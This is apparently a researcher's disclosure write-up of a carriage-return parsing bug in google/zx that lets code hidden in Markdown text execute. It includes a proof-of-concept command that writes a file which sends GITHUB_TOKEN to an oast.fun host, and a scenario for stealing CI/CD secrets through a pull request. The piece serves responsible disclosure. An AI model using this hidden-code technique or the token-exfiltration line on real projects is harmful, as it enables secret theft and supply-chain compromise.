
+++
title = 'Google VRP: To Be a Comment, or Not to Be?'
date = '2026-02-12T00:00:00+01:00'
draft = false
tags = ['Google', 'zx', 'RCE']
+++

## The Hook (The "What")

Can a single invisible character bypass a security sandbox?
![alt text](/images/stc/what-meme.gif)
I discovered a vulnerability in `google/zx` where a Carriage Return (`\r`) allows arbitrary code execution in Markdown files, right under the nose of code reviewers.


## What is zx?
In the world of DevOps, we often struggle with **Bash** (which is powerful but messy) and **Node.js** (which is clean but wordy).
**zx** is a tool created by **Google** that marries the two.


![alt text](/images/stc/zx.png)


It allows you to write scripts in **JavaScript**, but with the ease of a shell.
You can write commands like ```await $`ls`  ``` directly inside your code.

### The Markdown Script Feature


The interesting part of zx, and where our problem begins, is its ability to execute **Markdown** files (.md).

- **The Intent**: A developer writes documentation and includes code blocks (**three backticks**).
- **The Mechanism**: When you run `zx script.md`, **zx** parses the file. It treats the text as comments and the code blocks as executable commands.
- **The Sandbox**: To keep things safe, **zx** is supposed to "silence" any text that isn't inside a formal **code block** by wrapping it in **JavaScript** comments (`//`).


## The problem

The `transformMarkdown` function in `src/md.ts` is responsible for **parsing Markdown** files and converting them into executable JavaScript scripts.
It iterates through the file content by splitting it using the regex `/\r?\n/` (matching **LF** or **CRLF**).
However, this regex does not match a standalone **Carriage Return** (`\r`) character.

In JavaScript, a single-line comment started with `//` is terminated by any Line Terminator sequence, which includes **LF** (`\n`), **CR** (`\r`), **LS** (`\u2028`), and **PS**  (`\u2029`).

If a **Markdown file** contains a line with an embedded **CR** character (e.g., `Safe Text\rMaliciousCode`), `transformMarkdown` treats the entire sequence as a single line of text (non-code block). It then prefixes the line with `//` to comment it out. The resulting JavaScript code becomes `// Safe Text\rMaliciousCode`.

When **Node.js** executes this transformed code, the comment `// Safe Text` is terminated by the `\r`, and the subsequent `MaliciousCode` is executed as valid JavaScript. This allows an attacker to hide arbitrary code execution within the text sections of a Markdown file, which a user might inspect and believe to be safe documentation or comments.

This is particularly dangerous as some text editors or viewers may render **CR** simply as a newline or hide it entirely, masking the malicious code.

### Code Segment
Code segment is [here](https://github.com/google/zx/blob/2f6896ea6aa47190d11125f0024726b16d3ae745/src/md.ts#L26-L26)

![alt text](/images/stc/line_vuln.png)

## Context

- A [Bughunters Google](https://bughunters.google.com/) platform.

![alt text](/images/stc/bbh.png)

**First**, I describe a **scenario** and explain why, because it's advice given by the **Google Security Team** for writing a good report: [here](https://bughunters.google.com/learn/improving-your-reports/how-to-report/write-down-the-attack-scenario).

![alt text](/images/stc/advice_googler.png)


**Second**, the real value of the bug:

The **attack vector** is not about `executing untrusted Markdown.`
It is about the **inability** to audit Markdown before **execution**.
This vulnerability allows an attacker to bypass manual code reviews by hiding executable
commands inside documentation strings that `zx` fails to properly comment out due to the `\r` parsing anomaly.

- **The Starting Position**:
The attacker is a **contributor** to a popular open source project that uses zx for its automation
(e.g., a setup.md or deploy.md file).
The attacker has no special privilege other than the ability to submit a PR.

- **The Goal**:
The attacker wants to steal the **CI/CD** secrets (like `NPM_TOKEN`, `AWS_ACCESS_KEY`, or `GITHUB_TOKEN`)
from the project build environment or from the local machine of a maintainer who reviews the code.

- **The Strategy**:
The attacker exploits the interpretation conflict between the `zx` parser and the `Node.js` engine
to hide malicious code inside what looks like harmless documentation.


### Requirements

* Installation

```
tedsig42@exegol:~$ npm i zx -g
```

* Checking a `zx` version.

```bash
tedsig42@exegol:~/poc$ zx -v
8.8.5
```

* Poc creation

```bash
tedsig42@exegol:~/poc$ node -e "require('fs').writeFileSync('poc.md', 'Check logs...\rconsole.log(\'TOKEN:\', process.env.GITHUB_TOKEN); fetch(\'https://your_url.oast.fun/?leak=\' + process.env.GITHUB_TOKEN)')"
```

* Verification

Visible to humans (what we see):

```bash
tedsig42@exegol:~/poc$  cat poc.md
console.log('TOKEN:', process.env.GITHUB_TOKEN); fetch('https://qgiofgxlcsbxnelgcjyepgdtdvlowb6qm.oast.fun/?leak=' + process.env.GITHUB_TOKEN)
```
Hidden reality (with `cat -e`):

```bash
tedsig42@exegol:~/poc$ cat -e poc.md
Check logs...^Mconsole.log('TOKEN:', process.env.GITHUB_TOKEN); fetch('https://qgiofgxlcsbxnelgcjyepgdtdvlowb6qm.oast.fun/?leak=' + process.env.GITHUB_TOKEN)
```

Note that `Check logs...` isn't displayed with a plain `cat`.

## POC

- In local

```bash
tedsig42@exegol:~/poc$ zx poc.md
```

It displays nothing, but your environment variables have already been sent to another destination.

- On Github

`zx` is a tool used in GitHub workflow files for testing.

- *docs-test.yml*

![alt text](/images/stc/doc_yml.png)


- *poc.md*
What it looks like

![alt text](/images/stc/poc_md_github.png)

- *Result on Interact.sh*

You can see that it leaks a GitHub token even when the command is not in a code block.

![alt text](/images/stc/poc_result.png)

## Google Answer


![alt text](/images/stc/final_comment.png)

What **Not Severe Enough** Means

**Google's logic** is likely:

- **User Responsibility**: They believe that if a user runs `zx some-file.md`, the **user is responsible for trusting** that file first.

- **The "Feature" Argument**: Since `zx` is designed to run code from Markdown, they see "unintended" code execution as a minor parsing flaw rather than a catastrophic security breach.

## Conclusion

This bug helped me tell the difference between a real bug and one that can impact an enterprise threat model.
In professional security, we often talk about the **Threat Model**.
This bug is the perfect example of a vulnerability that exists not in the code itself, but in the gap between how humans work and how machines execute.
Thanks to the **Google Security Team** for the advice and resources on their [learn](https://bughunters.google.com/learn/) platform.

## End
At the end, I received this:

![alt text](/images/stc/FInal_message_google.png)


Thanks for helping me with a tweet.
I also opened a [GitHub issue](https://github.com/google/zx/issues/1403) and a [pull request](https://github.com/google/zx/pull/1404)

![google_vro_bug1](/images/stc/g-bug-1.png)

- **Feb 10, 2026**: Initial report to Google VRP.
- **Feb 11, 2026**: Google VRP confirmed the bug but closed the report and authorized disclosure. Issues and the pull request were also opened on `google/zx`.
- **Feb 21, 2026**: Fix merged
